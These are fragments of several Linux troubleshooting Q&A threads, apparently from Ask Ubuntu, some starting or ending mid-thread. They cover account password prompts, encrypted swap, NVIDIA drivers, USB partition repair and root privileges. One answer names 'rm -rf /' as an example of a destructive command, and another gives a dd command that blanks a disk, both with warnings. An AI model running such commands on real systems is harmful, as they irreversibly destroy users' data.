file\n~/.config/goa-1.0/accounts.conf\n\nIt worked nicely for me.\nThanks to this comment: bugs.launchpad.net/ubuntu/+source/gcr/+bug/1044549/comments/14\n\nA: Your \"Password was incorrect\" problem is because \"GMail\" identifies \"Evolution\" as a less secure app, so doesn't provide authentication to the app.\nYou can change this feature if you want,\nhttps://www.google.com/settings/security/lesssecureapps\nBut if you don't want to allow your email access to evolution, you can remove your gmail account in evolution by following these steps\n\n\n*\n\n*Open Evolution\n\n*Edit\n\n*Preferences\n\n*Select your email account, then press \"delete\"\n\n\nThis should remove your email account from evolution and no more signing in troubles anymore.\n\nA: If it's for a Google account with two factor authentication enabled, generate a one time \"Application-specific password\" for it at the Google account security tab\n\nA: I ran into this issue because of Google's Two Factor authentication. If you want to stop receiving this prompt you need to generate an application specific password from Google.\nFor instructions on how to create the app specific password follow this bad boy below.\nhttps://support.google.com/accounts/answer/185833?hl=en\nOnce you've followed those instructions, grab the generated password, plug it into the prompt, and be bothered no more!\n(This solution was used in 13.04)\n\nA: Removing the *.source file(s) from ~/.config/evolution/sources did the trick for me - those dialogs are gone for good.\nSource: http://ubuntuforums.org/showthread.php?t=2131506&p=12759547#post12759547\nThough, in my case, this was probably due to a combination of the other answers (Google 2-factor auth) and the fact that I had upgraded from an earlier version of Ubuntu and the account configurations were left over.\n\nA: That happened to me. You need to sign out of gmail and reboot your computer/laptop. Then sign in a it should work. Tell me if you have any problems.\n\nA: I believe the problem is that GNOME Search is checking Contacts. \nThere is an option in Settings -> Search to deselect Contacts, and that should save the day.\n\nA: The accounts.conf file is also used by the new Ubuntu online accounts configuration. The problem seems to be that after an upgrade the old entry from the original Gnome online accounts application is left. The new online accounts utility adds entries after the previous one which is the one causing the problem.\nThis is the old entry in my case from ~/.config/goa-1.0/accounts.conf:\n[Account account_1388648527]\nProvider=google\n<email address hidden>\n<email address hidden>\nMailEnabled=true\nCalendarEnabled=true\nContactsEnabled=true\nChatEnabled=true\nDocumentsEnabled=true\n\nJust editing the accounts.conf file and removing just this entry solved the problem.

It's unbelievably irritating.\n\nIt can appear when I'm just typing into a text document, hours after the computer booted, or it can happen three seconds after I log in and haven't had a chance to interact with the desktop.\nIf I press \"Cancel\" the dialog may reappear within a few seconds, or a few hours.  Sometimes the laptop just powers off instantly a few seconds after pressing \"Cancel\".\nWhen this dialog appears, I don't see anything weird in /var/log/*log and I don't see any suspicious processes running.\nI have managed to capture this by monitoring the dbus session bus, when the dialog appears:\nmethod call sender=:1.6 -> dest=org.gnome.SessionManager serial=285 path=/org/gnome/SessionManager; interface=org.gnome.SessionManager; member=Shutdown\nmethod return sender=:1.0 -> dest=:1.6 reply_serial=285\n\nBut that gives me no clue as to who is requesting a shut down.\nThe physical power button (on this Thinkpad T420s) is not mapped to the shutdown prompt, and pressing it does nothing.\n\nI've also seen this random shutdown behaviour if I boot the laptop, then kill lightdm so that no X server is running.

Then it does.\nAny ideas what this could be, or how I can debug further?\n\nUpdate:\nThis also happens with a Ubuntu 10.04 live CD and a 12.04 live USB drive.\nHowever, I swapped out my SSD and put in the original HDD and I was able to install and run Windows 7 for a while without problems. \nSo, since this problem appeared recently and occurs on multiple OS versions, I'd guess it's potentially a hardware problem. But given that I can't see what (haven't seen any phantom key presses in showkey) is wrong, and because Windows works, I don't really have a good case for calling in my Thinkpad warranty...\n\nA: I believe this is caused by a hardware fault.\nUsing the acpi_listen tool, I was able to see that a button/power PWRF event was being generated when the shutdown dialog appeared.  This is what would happen if you hold down the physical power button for a couple of seconds.\nThe laptop shutting off entirely now and then is equivalent to holding down the power button for five seconds or so.\nI was able to reproduce this in other Ubuntu versions, but also eventually under Windows 7.\nSo I guess there's some sort of malfunction in the keyboard controller or similar, which causes phantom power button events to be sent.\nCurrently, I'm using a USB keyboard and for a couple of hours, no shutdown events have occurred.  So it appears to be triggered when using the built-in keyboard to type.\nMystery solved.

The root partition is on one disk, the swap partition on the other. Both disks are encrypted and I have added the corresponding entries to /etc/crypttab.\nDuring boot, it asks for the passphrase for the disk with the root filesystem. Then it continues booting and gets to the login screen before I get a chance to enter the passphrase for the other disk. After logging in, I verified that it was actually waiting for me to enter the passphrase for that second partition (askpass process is running). But at that point, I have no way of entering the passphrase anymore.\nThe manpage for crypttab suggests that the order in which the volumes are specified matters, so I changed it to have the swap disk first. I updated the initramfs and grub afterwards, but it didn't make any difference.\nHow can I specify the order in which the encrypted partitions are unlocked? I'm looking for a solution that either asks for the swap passphrase first or tells the system to wait until all encrypted partitions are unlocked before displaying the login screen.\nIdeally I want to be able to use hibernation, i.e. neither use a random key for swap nor encode the key in crypttab.\n\nA: After some more digging, I found the decrypt_derived script. It allows to derive the passphrase from another encrypted partition. I set up the swap partition in this way, made the necessary changes to /etc/crypttab and it works! I only need to enter one passphrase, the second partition is unlocked automatically during boot and hibernation works.\nMore details e.g. here.\n\nA: If you don't care about hibernation, you can put the password for the encrypted swap partition into a file on the root partition. /etc/crypttab can then point to that file, and you can bypass this issue altogether.  This isn't a security risk, since your root drive is encrypted.  As a bonus, since you don't plan on using hibernation, you can actually have the swap file use a random key each time by setting this file to /dev/urandom.

The result is that my system (jokey) tells me that the driver is there but not in use and I only get a 640x480 resolution. If I try to launch nvidia-settings it does indeed tell me that the nvidia driver is not used.\nI do all this under kde but I guess it does matter at this stage.\nAny hint of how to resolve this? I feel stuck and cannot use any of the acceleration which is partly why I got that laptop in the first place...\nthanks for any help/advise you may provide!\n\nA: The working solution can be found at the link below:\n\n\n*\n\n*Make sure to have the system up to date first (so the new kernel is applied first).\n\n\nhttps://askubuntu.com/a/202680/111057\nIt allows nVidia driver deb to compile the kernel boot module as it's installing, but it fails without the correct packages (that are not included by default and not a dependency of the nVidia drivers deb/package directly). After I did the above fix I had full resolution on Ubuntu 12.10, Mint v14 and Kubuntu 12.10.  \n\nA: The modules should install and work to some extent.  There may be other problems such as performance or corruption, but that's another issue.  You do have to reboot, or at least re-start X for the module to take effect.  Are you being impatient and not giving it a chance to load the drivers?  To recap the procedure:\nsudo apt-get install nvidia-current\n\nor\nsudo apt-get install nvidia-current-updates\n\nthen \nsudo reboot\n\nor just log out and log back in again to re-start X.  (Given your problems, maybe a fresh boot wouldn't hurt, though theoretically a re-start of X is all that is required.)\nNext try \nnvidia-settings\n\nIf the driver is working well enough for you to see, it should load the settings program.  Having a laptop default to some really low-res mode is darned odd. It should not be happening, even (especially) with the nouveau driver.\nI take it you installed Ubuntu and then added KDE?  Maybe just try the default Unity for a while.  I don't use KDE so I'm not aware of any specific problems with it that might be making your job harder.  Maybe get rid of /etc/X11/xorg.conf and start fresh.\n\nA: I had the same problem with my Lenovo G780... Could not understand why the nvidia-drivers weren't working.\nTHEN... I discovered the notebook relies on Optimus technology. Hybrid graphics where the nvidia chip is \"piggybacked\" onto the intel graphics. Useful for saving a lot of power, the nvidia only comes into play when using graphics intensive programs. \nThis is a great feature... when you are running Windows. Linux has yet to catch up but there are open source measures being taken. \nThe project is called Bumblebee. It works for me so far.\nI wish I had known this before. I'm not sure if this applies to your scenario but from what I've read, the technology is used greatly by Sandy/Ivy bridge chipsets.\n--edit-- \nYou can check for Optimus by running the following command:\nlspci -vnn | grep '\\''[030[02]\\]'\n\nIf it outputs two lines, you're likely having an Optimus laptop.\n\nA: I ran into this problem on release day and running sudo apt-get install linux-source linux-headers-$(uname -r) worked, at the time, and until the update this past week (Nov. 4) broke it again.\nRunning \nsudo apt-get remove --purge nvidia-current linux-source linux-headers-*\nsudo apt-get autoremove --purge\nsudo apt-get update\nsudo apt-get install nvidia-current\n\nworked this time.\nI assume that at release nvidia-current wasn't pulling the headers and sources as dependencies and now that it is, it somehow confused it.

Everything is great, except for one thing: the icon in the Application Switcher for emacs24 is a horrible, low-resolution eyesore.  Compare the two side-by-side:\n\nI've seen a couple of questions addressing issues like this, but they're not quite the same.  This one says that it is happening with all icons, but that's clearly not the case here.   And this one seems more relevant, but it is talking about Gnome, not Unity.  \nIn the comments to the one answer for the second question, it says to look at the icons in /usr/share/icons to see if they are low-resolution, and if so to replace them with better ones.  There's a ton of emacs icons, in fact.  They are in various subfolders of \n/usr/share/icons/hicolor and they are in sizes ranging from 16x16 to 128x128, and also there are scaleable .svg versions of the icons too.  \nI noticed that there are no 192x192 or 256x256 versions. But it seems like that shouldn't matter, since emacs23 also didn't have icons in those sizes.\nAny help would be much appreciated!\n\nA: I too had those blurred icon, using either Linux Mint Debian Edition with Cinnamon, or Debian stable Wheezy with Gnome 3. I believe that source of issue is Gnome.\nWhile digging, I noticed that for one same application, I could get : \n\n\n*\n\n*blurred icon when application is launched via terminal command line, or via Gnome Alt+F2.\n\n*nice icon when application is launched via Gnome Shell or via Gnome Do.\n\n\nWhat helped me to find a solution is this post. The point is that sometimes you run via command line emacs, but the desktop file is emacs23.desktop. At some point, Gnome is not able to make the link from emacs to emacs23.\nThe solution that I found and that worked for me is, for all applications where I have a pixelated icon, I create an .desktop in $HOME/.local/share/applications, respecting the following rules:\n\n\n*\n\n*filename syntax is <application>.desktop\n\n*<application> must be the command used to launch via terminal.\n\n*inside <application>.desktop, have a line StartupWMClass=<application>\nOne example that would make this fails, is that you create an emacs24.desktop file, but you are also able to run emacs from the command-line, and that emacs is launching emacs24.\n\nA: I have noticed that this kind of icon blur happens when an application opens a dialogue or any window for something. \nYou can try making 192x192 and 256x256 versions in Gimp by clicking Image>Scale, it might help. \nThis might sound a little odd, but try deleting every icon size for that app except for the scalable one. I have made an entire icon set with only scalable icons (in PNG format). They look great normal sized and very large, but when very small (like 16x16) they aren't clear.\nI wanted to put this as a comment because I am not 100% sure of any of this, but it would have been too long. But if it works then cool :)\n\nA: What worked for me is appending --class=\"<application>\" to the Exec command in ~/.local/share/applications/<application>.desktop, as mentioned here.\n", "Q: Ubuntu 12.04.1 LTS USB not being detected after formatting with Startup Disk Creator sudo fdisk -l lists the drive, however, I cannot find it in the file explorer.\nDisk /dev/sda: 250.1 GB, 250059350016 bytes\n255 heads, 63 sectors/track, 30401 cylinders, total 488397168 sectors\nUnits = sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisk identifier: 0x000d871e\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sda1   *        2048   486322175   243160064   83  Linux\n/dev/sda2       486324222   488396799     1036289    5  Extended\n/dev/sda5       486324224   488396799     1036288   82  Linux swap / Solaris\n\nDisk /dev/sdb: 8195 MB, 8195480064 bytes\n253 heads, 62 sectors/track, 1020 cylinders, total 16006797 sectors\nUnits = sectors of 1 * 512 = 512 bytes\nSector size (logical/physical): 512 bytes / 512 bytes\nI/O size (minimum/optimal): 512 bytes / 512 bytes\nDisk identifier: 0x00027ae4\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1   *          62    15999719 M    7999829    c  W95 FAT32 (LBA)\n\nManually mounting it produces this error message\n:~$ sudo mount -t vfat /dev/sdb1 /media/external -ouiduid=1000,gid=1000,utf8,dmask=027,fmask=137        \nmount: wrong fs type, bad option, bad superblock on /dev/sdb1,\n       missing codepage or helper program, or other error\n       In some cases useful info is found in syslog - try\n       dmesg | tail  or so\n\nIs the usb toast?\nUPDATE:\nThank you to everyone who has responded thus far. It is a Sandisk Cruzer and the solution proposed by fabricator4 worked. \n\nA: No, it's not toast.  Startup disk creator is very particular about the partition table, and the partition table written by the manufacturers is often inconsistent with Linux.  Another symptom is that Disk Utility and Gparted are not able to delete the partition table.\nYou can repair the device by erasing the partition table with dd:\ndd if=/dev/zero of=/dev/sdX bs=512 count=1\n\nChange sdX to the correct device which in your example above will be sdb.  Do not get it wrong because the target device will be made completely blank in the blink of an eye. There will be nothing visible on the device after you run this command.\nYou can then create a new partition table with disk utility or Gparted and create a FAT partition that boot disk creator (and linux utilities in general) will be happy with.\nA possible explanation for the inconsistent treatment of partition tables can be found in the Linux cfdisk manual page (cfdisk is a text based utility for manipulating disk partition tables):\n\nDOS 6.x WARNING\n   The DOS 6.x FORMAT command looks for some information in the first sec‐\n   tor of the data area of the partition, and treats this  information  as\n   more  reliable than the information in the partition table.  DOS FORMAT\n   expects DOS FDISK to clear the first 512 bytes of the data  area  of  a\n   partition  whenever a size change occurs.  DOS FORMAT will look at this\n   extra information even if the /U flag is given -- we  consider  this  a\n   bug in DOS FORMAT and DOS FDISK.\n\n\nPartitioning and formatting tools that may be based on DOS versions or use the same logic for making partitions that are used by the OEMs may therefore be setting Linux users up for this problem.  The main USB sticks I've had problems with are the good branded ones (eg. Verbatim) that include so-called backup or synchronisation software for Windows based machines. \n", "Q: is it necessary to format windows XP OS to do partitioning for Ubuntu, and how do I do it properly to then install Ubuntu from disk is it necessary to format windows XP OS to do partitioning for Ubuntu, and how do I do it properly to then install Ubuntu 10.10 from disk, and would it work from 10.10 to get 12.04 updates?\nThank you all; for being, for being soooo forth-giving and for all you ever will to be.

Unfortunately they are not as well supported as Windows. In my personal experience, I find Nvidia to be having a better drivers than ATI, on the other hand ATI has better support for open source drivers, but they often lack proper support for their latest cards (for instance the fusion platform almost took a year to get proper video accelaration support from the drivers).

I know that you can set the touch pad to scroll on the right side, but is it possible to scroll left and right? I mean, when there are websites that require side scrolling, is it possible to swipe on the top or bottom of the touch pad?\n\nA: Yes.  Open Systems settings then click \"Mouse and Touchpad\"\nOpen the touchpad tab and then enable both \"two finger scrolling\" and \"horizontal scrolling\"\nI actually disabled this feature after trying it for a while because I found it annoying if the screen scrolled horizontally when all I wanted was a vertical scroll.\n", "Q: Multi-Select Group of Items in Listbox using Ctrl+Shift+Mouse1? For a while since I've switched to Ubuntu from Windows, I've been wondering about this. In windows, you can select an item in a listbox, hold Ctrl+Shift, then select another item, and all the items between the two that you selected will also be selected (see the picture below). My problem is, in some cases I have a few hundred items to select out of thousands, and the only way to select them is to individually select each of them while holding Ctrl. Is there a way to enable this ability in Ubuntu (even if it's just for GTK programs)?\n\n\nA: It does indeed work this way, except you don't click on the item that is already selected, you have to click on the last item that is not selected.\nInterestingly, \"last item\" depends on whether selected the top set first or the bottom set.  If you selected the bottom item first the the \"last item\" is actually the upper one of the group in between.  It's kind of intuitive, but would be odd if the system you used previously works in a slightly different way.\nRecap:\nIt already does what you want.  Select and item at the top of the list.  Scroll down.  Select and item at the bottom of the list while holding Ctrl.  Now hold CtrlShift and click on the last unselected item and all the items in between will be selected.\nOf course, you could also have just selected one item at the top, then CtrlShift clicked on the last item to achieve the same result.  It appears to work exactly how you want it to.\n", "Q: ASUS X401A ubuntu installation I tried to install Ubuntu in my laptop ASUSX401A. I removed Windows in the partition table at the installation. All okay up to here, however when I reboot the HD after finish the installation, the HD was not recognized, in the BIOS it appears that the HD only option was the Realtek card, then was impossible to enter to Ubuntu. After that I tried again to install  Ubuntu but now I have a error in the input/output when I wanted the enter the table partition. \nI appreciate any help.\n\nA: Fabian, I think you are facing a hardware problem and not a software problem. I think your hard drive or your controller might be broken. I suggest you do an RMA.\n\nA: I have the same notebook an had no problem with installing system on it... ( ubuntu )\nYou will need to take your HDD out and test it on other computer to see if it's still working and then we can suggest what is the problem.\nTo take it out you will need to open whole notebook ( there is no little cover to open and take your HDD out )\n", "Q: Why can't I connect to the internet at all with Ubuntu 12.04 LTS or 12.10? So one day I was using my server and decided since I had a page of updates that had been piling up. That was my first problem... I had heard never to update things on Ubuntu but I disregarded that. Anyways I updated to 12.04 and when it was done it would not let me connect to the internet. I have tried re-installing the operating system but to no avail. I have been using Ubuntu for a few months but I'm not to good with it. Thanks.\n\nA: Are you sure that Ubuntu installed the drivers for your hardware? Are you connecting through ethernet or wifi? A little more information is needed here.\nOpen terminal and type: sudo lshw -c network and look for your network interface. Check and see if it's broadcasting or not.\nIf you need more help with it, run the command and post your results here.\n", "Q: Bash Script Progress I am forming a new question based on an earlier one I posted here in regards to a BASH Script I am writing. This is only one function of the script but I started here because I figured I would have best success with completing this function over others.\nThe code that I have thus-far is:\n#!/bin/bash\nclear;\nwelcome=\"- Sudo Bypass Package Installer -\";\necho $welcome;\npkgFetch() {\n    echo -n \"Name of package you would like to install: \"; read pkg\n    chkPkg=$(dpkg -s $pkg|grep installed); echo \"The Package [$pkg] is already installed.\"\nif [ \"\" == \"$chkPkg\" ]; then\n    echo  \"The Package [$pkg] is installing...\"\n    sudo apt-get install $pkg -qq\n    echo  \"The package [$pkg] was successfully installed.\"\nfi\necho  -n \"Press ENTER to return to command-line.\"\n};\npkgFetch;\nread;\nclear;\n\nThe first part, which checks if the package is installed (if it is the script returns the message stating it's already installed) appears to be working correctly. However, I encounter a few things here that I can't make sense of...mostly because I am a novice.\n\n\n*\n\n*If [$pkg] is not installed, the script still displays the message saying that it is, followed by the message that should be displayed if not installed, which is that it is currently installing.\n\n*The script doesn't silently install the package. It shows that it is reading database, unpacking $pkg, processing triggers, and setting up $pkg. Afterwards, the script displays the correct message that \"The package [$pkg] was successfully installed\".\n\n\nAnyone want to take a shot at it here and educate me about my errors? \nThanks in advance : - )\n\nA: the message saying, that the package is already installed is completely unconditional, it is displayed wether the grep returns successful or not.\nYou could prepend it with [ -n \"$chkPkg\" ] && to make it conditional (on a nonempty chkPkg variable), or even better pull it into the if block like that:\n\nif [ \"\" == \"$chkPkg\" ]; then\n  echo  \"The Package [$pkg] is installing...\"\n  # ...\nelse\n  echo \"The Package [$pkg] is already installed.\"\nfi\n\nBTW. You should match variables in shellscript with a single =, not with ==. The latter is not posix conform and will not run in some unix shells apart from bash. Such things are called \"bashisms\", avoid them where it doesn't inconvenience you too much.\n", "Q: I've filed an ITP bug on bugs.debian.org - now how do I get the package into Ubuntu? I've written a development library that I would like to include in the Ubuntu archives. From what I understand, the best way to do this is to first get the package into Debian and then request a package sync.\nHere is the ITP bug.\nWhat do I do now?\nLooking at this page, I see horrifying things like \"419 days in preparation\" and \"last activity 404 days ago\". I get the impression that getting a package into Debian is a slow process.\nIs there anything I can do to speed up the process? I've tried to do as much work as I can to smooth out the process - I've got a branch with Debian packaging (which gets by Lintian without any errors).\n\nA: As you've already worked out, creating an ITP bug doesn't get your package into Debian.\nITP bugs are how the Debian maintainers let each other know what they are working on, and elicit comments on proposed new packages.\nThere are hundreds of such bugs, and most of them aren't showing much progress.\nSo, you need to move along to the next step, which is to find a sponsor for your package.\nThe mentors site has a guide that you may find useful here.\nYou've got as far as step 3 in that process.\nI suggest uploading your package to mentors.debian.net, and filing a sponsorship request bug.\nOnce your package is in Debian unstable, it would be automatically synced to the Ubuntu development release. Assuming Ubuntu was currently pre-Debian-Import-Freeze, if not, it'd have to wait until the next Ubuntu release.\n\nA: Once your package gets into Debian repository, it will be auto-imported into Ubuntu repository of the then current developmental release prior to the date of the Debian Import Freeze. So, if your package gets into Debian Unstable repository before February 14 (tentative DIF date for 13.04), it will get auto-imported into 13.04's repository without you ever intervening. \nIf you can't get the package into Debian before DIF but eventually do before Feature Freeze, as per the guidelines for requesting a new package for Ubuntu, you \ncan then file a bug report with the summary field \"Please sync packagename from Debian distro\".\nIf that is not an option either, you can file a bug report with the tag needs-packaging with essential information about where to obtain the source and the license the software is under. \nSee also New Packages on Ubuntu wiki for more information.\n\nNow if you want to speed up the process of getting your package into Debian, you might want to try http://mentors.debian.net/. Here's a quick intro on how to find mentors and sponsors for your package.\n\nA: You can get your package some special attention by contacting one of these guys\nhttps://wiki.ubuntu.com/MOTU/Contact?highlight=(CategoryMOTU\nKeep in mind that your going to be subject to feature freeze and other requirements. They can really help if your having problems, but if your package is of low priority, or theres not alot of people using it, then you might be better to just want to wait. \n\nA: i'll sugget you to connect any Debian Maintainer you know , or you should just go to the irc room and ask for help.\nhere are few links you should read before you ask question\nhttps://www.debian.org/doc/manuals/debmake-doc/index.en.html \nand\nhttps://www.debian.org/doc/manuals/maint-guide/\n", "Q: How to add \"Open terminal here\" to Nautilus' context menu?

However, I am concerned with potential compatibility issues. I've tried searching around but I haven't found information which clearly addresses my particular situation.\nMy server is running Ubuntu 10.04 on an Intel P35 chipset based system. The motherboard does not support UEFI (and, by extension, GPT?). However, Ubuntu does support >2TB disks. Will I be able to properly utilize these new disks, or does the motherboard limitation trump all else? The boot disk is <2TB and will not be updated nor am I dual-booting; these disks will be used strictly as slaves in a pure Ubuntu environment.\nI'd hate to pull the trigger on these new disks just to be unpleasantly surprised, so any feedback is appreciated. Thanks!\n\nA: You should have no problems -- at least in theory. Motherboard compatibility isn't really an issue; once the computer is booted, the Linux kernel is in charge of things, so the issues involved (hard disk size and partitioning method) must be resolved by the Linux kernel, not by the computer's firmware. The Linux kernel has long supported both large hard disks and GPT. If you dual boot with Windows, though, there are potential hazards, since some Windows drivers use 32-bit pointers, which will end up trashing data on over-2TiB disks.\nIn fact, the old BIOS firmware doesn't explicitly support any partitioning system, not even the Master Boot Record (MBR) system used on most BIOS computers. Thus, lack of GUID Partition Table (GPT) support in BIOS isn't an issue, even if you wanted to boot from the disk. (There are some caveats and limitations, but I won't get into those since they'd just be a digression, given that you don't plan to boot from the disk.)\n", "Q: Unable to mount hard disk I am unable to mount hard disk and got this message:\nUnable to mount 158 GB Filesystem\nError mounting: mount: wrong fs type, bad option, bad superblock on /dev/sda1,\nmissing codepage or helper program, or other error\nIn some cases useful info is found in syslog - try dmesg | tail or so\n\nFrom the terminal, I tried syslog - try:\nNo command 'syslog' found, did you mean:\nCommand 'dsyslog' from package 'dsyslog' (universe)\nCommand 'syslogd' from package 'sysklogd' (universe)\nCommand 'syslogd' from package 'inetutils-syslogd' (universe)\nCommand 'syslogd' from package 'busybox-syslogd' (universe)\nsyslog: command not found\n\nAlso tried dmesg | tail:\n[ 971.390588] sd 0:0:0:0: [sda] CDB: Read(10): 28 00 12 62 30 80 00 00 40 00\n[ 971.390600] end_request: I/O error, dev sda, sector 308424832\n[ 971.390605] Read-error on swap-device (8:0:308424840)\n[ 971.390608] Read-error on swap-device (8:0:308424848)\n[ 971.390617] Read-error on swap-device (8:0:308424856)\n[ 971.390620] Read-error on swap-device (8:0:308424864)\n[ 971.390623] Read-error on swap-device (8:0:308424872)\n[ 971.390626] Read-error on swap-device (8:0:308424880)\n[ 971.390629] Read-error on swap-device (8:0:308424888)\n[ 971.390632] Read-error on swap-device (8:0:308424896)\n\nIt was fine before I tried to re-install 12.04 from the live CD (which failed due to the disk problem).\n\nA: Boot off the LiveCD and try:\nsudo mount errors=remount-ro /dev/sda1 /mnt\n\nIf this manages to mount the drive in read only mode, you should back up any important data that you may have which should now be accessible at /mnt/home/your_user_name/\nIf it complains about not knowing what the filesystem type is, try\nsudo mount -t ext2 errors=remount-ro /dev/sda1 /mnt\n\nIt seems the device might be failing if it's not completely dead.

I am having some strange issue with Kate and Kwrite. When I click on Open File, it crashes with segmentation fault. \nI am a complete newbie to Linux, and I think the issue is that I am not running the application as root. \nHow do I run applications as root in Ubuntu? Is it bad practice to do this? What is the purpose of the whole root thing, where even though we need to use root so frequently, it is not utilized as default?\n\nA: In addition to the previous answer, which says about sudo and gksudo, yes, it is definitely a bad practice to run a program as root unless this is an administrative one. \nPlease try to find you why the programs are crashing. Please seek help of others if you need to.\n\nA: It is pretty simple to run a program as root.\nFor a console program use \nsudo <program name>\n\nIf it is a GUI application use \ngksudo <program name>\n\n\nA: UNIX-like operating systems (including Linux) use a concept called privilege separation to ensure that the system stays safe.  UNIX was designed as a multi-user system from the ground up - that is, it was designed so that many people could use one computer running UNIX at once.  Because most users don't need to be able to modify the core system only the system administrator should have that privilege.  That privileged user is traditionally called root.  (Root is a lot like Administrator in Windows.)\nThis makes sense on several levels.  Commonly, a web server or other process that exposes a port to other (possibly malicious) computers will run as its own user (Apache runs as the user nobody), so that even if the web server program is hacked, the attacker can't trash the entire machine quite so easily.  It even makes sense for mostly single-user machines such as desktops:  if other members of your family, for example, somehow manage to run rm -rf / (do NOT run that), they won't have permission to delete every file on the system, like they would if there were no such thing as privilege separation.\nThere are several commands you can use to elevate your privileges. The sudo command exists to temporarily give you root-level privileges when you need them to administer the system. You can also use the commands gksudo or su.  The latter can be used only if you know root's password and is a good option if your account doesn't have permission to use sudo.\nThe root user can do anything on a system, with almost no exceptions.  So even if you request something by accident, it will be carried out with little or no warning, even if it's bad for the health of your system.  This is why it's good practice to do most of your activities as a normal user, and use root only when needed, like when you're installing a program.\nYou shouldn't need to use root to get rid of a segmentation fault.  If root is the only thing that fixes a segfault, then the program has a bug.  Programs should not fail like that just because they don't have root.\n\nA: You can also go to /usr/share/applications in ubuntu and edit the launch file of the application you are trying to run.\nLike i edited the file of github atom, normally i use a wildcard to find the files like this  \nsudo nano atom*\n\nThis will open the atom.desktop file, now find the Exec command and prepend gksudo.For eg.,  \nBefore  \nExec=/usr/share/atom/atom %U  \n\nAfter  \nExec=gksudo -k -u root /usr/share/atom/atom %U\n\nNow whenever the application is launched it will ask for root password.\n\nA: If you get error like this:\nsudo: program-name: command not found\n\nwhen calling it this way:\nsudo program-name args\n\nFor example:\nsudo dotnet run --configuration Release\n\nsudo: dotnet: command not found\n\nYou can get path to a program by using\nwhich program-name\n\nAnd then use that path:\nsudo path_to_program args\n\nExample:\nsudo $(which dotnet) --configuration Release\n\n", "Q: Boot ubuntu 12.04 in 3D - nomodeset quiet splash install I would like to enable 3D in Ubuntu 12.04.\nI recently tried to install ubuntu on a new computer. When the installation was complete and I rebooted the machine, I could only see a blank screen. \nAfter some searching, I followed this tutorial which instructed me to boot with \"nomodeset\" enabled. I choose this on the USB I was installing ubuntu 12.04 from.\nFortunately, the ubuntu installation on the new computer was successful. When I tried to change the size of the unity launcher icons, I did not see that option (as I see on my other computer running ubuntu 12.04).\nI tried installing MyUnity and it told me that the computer I had just installed 12.04 to was running in 2D.\nTo my knowledge. all the software is up to date (as I ran the Software Updater). In addition, when I look for Additional Drivers, I see a message that says \"No proprietary drivers are in use on this system\".\nWhen I look under System Details > Graphics, I see the Driver as \"VESA:Intel Sandybridge/Ivybridge Graphics.\nWhen I hold the shift key on when my machine boots up, and type \"e\" on the Grub menu, I see the following towards the end, \"nomodeset quiet splash $vt_handoff\".\nDoes this have anything to do with the plain 2D ubuntu 12.04 experience?

The fact that reinstalling windows also asks for a format confirms this: windows cannot use the Ubuntu file-system.\nThis means that you should STOP adding stuff to your harddisk.

In theory, the screen brightness can be adjusted downward by pressing fn+f5, and adjusted upward by pressing fn+f6.\nIs there a way I can connect the monitor brightness settings to these function keys?\n\nA: According to the Zenbook Prime community page, the answer is \"yes\", with a caveat.  It looks like the problem will be fixed in a 3.7.x version of the kernel (see this bug), but still exists in 3.5.x (i.e. Ubuntu 12.10).\nFor now, you can try applying this patch to the 3.5.x kernel.  For instructions on building the kernel and applying patches, see here.  Again, according to the Zenbook Prime community page the patch is imperfect.  The brightness-down key works fine, but the brightness-up key imposes an ~2 second delay before other hotkey presses are registered.\nThe community page also lists a couple of workarounds that involve the xrandr command.  The second workaround involves a custom script that is then mapped to Ctrl+Shift+F5/F6.  You could, of course change the keymapping to anything you like (say just F5 or just F6, for example).\n\nA: I can confirm the brightness keys don't work on an N56VJ either.  I run xev and it shows absolutely nothing when fn + f5 or fn + f6 are pressed.  The fn key that turns the backlight off completely does work, the system dialog to adjust backlight brightness works, and \"echo 5 > /sys/class/backlight/brightness\" does set the light to 50 percent.. So the procedure to set the backlight is functioning properly, the issue is getting a valid keypress event out of the function keys.\n\nA: Although I am on Mint Nadia, my research should be helpfull:\nFirst of all you should know that if the grub tweak did not work and if in ubuntu you have no keycode on pressing Fn+F5 or Fn+F6 those keys will be suported from 3.7 kernel version (as I read somewhere). My case is this: those combinations just don't exist under ubuntu or mint (tried both), instead all other Fn combinations work properly or at least they generate a code for the combination (in easystroke, when adding new action, selecting key, then pressing desired Fn combination you get for example XF86WebCam). My notebook is Asus K55VD with I7 processor and nvidia 610m.\nI've managed to do a workaround with xdotool and xbindkeys.\nThe main ideea for the workaround to work is to actually have other Fn combinations, not working by default in your distro and void key combinations like Ctrl + Key, Alt + Key (once you press Ctrl, for example no other key has effect).\nXdotool is used to emulate a virtual key - xdotool key XF86MonBrightnessUp for increasing brightness emulates XF86MonBrightnessUp and xdotool key XF86MonBrightnessDown for lowering brightness(emulates XF86MonBrightnessDown, and if you use Ctrl + <KEY> command, Ctrl won't let XF86MonBrightnessDown/Up to work. \nThere is a workaround for this too (the use of \"Release\" key modifier in xbindkeys and creating scripts for both commands including some delay) but it will give you hard time with your brightness: you will have to try the combination a few times before succeeding once, and I mean emulating one movement of the brightness slider (on Asus there are 10 before reaching bottom).\nSo how I did it:\n1. install xbindkeys\n2. install xdotool\n2. \"xbindkeys\"   in terminal to start it\n3. \"xbindkeys --defaults > $HOME/.xbindkeysrc\" in terminal to generate the file where your keybinds will be.\n4. open  \".xbindkeysrc\" from /home/user directory. There you will see some default examples. Either delete them or comment them with #.\n5. for Asus add lines like this:\nxdotool key XF86MonBrightnessUp\n  XF86WebCam\nxdotool key XF86MonBrightnessDown\n  XF86Launch1\nXF86Launch1 is Fn+c and XF86WebCam is Fn+v and they are close to each other, therefor proper.\nSave, then end or kill xbindkeys (from System Monitor for ex) , then start xbindkeys (from terminal for ex).\nThey work for me, but not continuesly - every XF86WebCam results in one level brightness up, then holding Fn I have to press again on V and so on. You will not have this luxury if you use a standard combination (assuming they work). You will have to release both keys, then press them again, not getting quick result.\nI tried using Fn + Arrow Up and Fn + Arrow Down. The first didn't work, the second worked, so i could only change brightness down (or up).\nfor other notebooks: kind of the same thing but you have to test you own keys,\nThere is a way without xdotool:\ninstall xbindkeys, install xbacklight, generate .xbindkeysrc, and edit it with this:\nxbacklight -dec 10\nControl + F5\n\nxbacklight -inc 10\n Control + F6\n\nThis time you can use modifiers combinations (there is no virtual key generated), but brightness doesn't change that smoothly, and if you keep pressing the combination, in System Monitor you will see multiple xbacklight instances. It's continuous, but 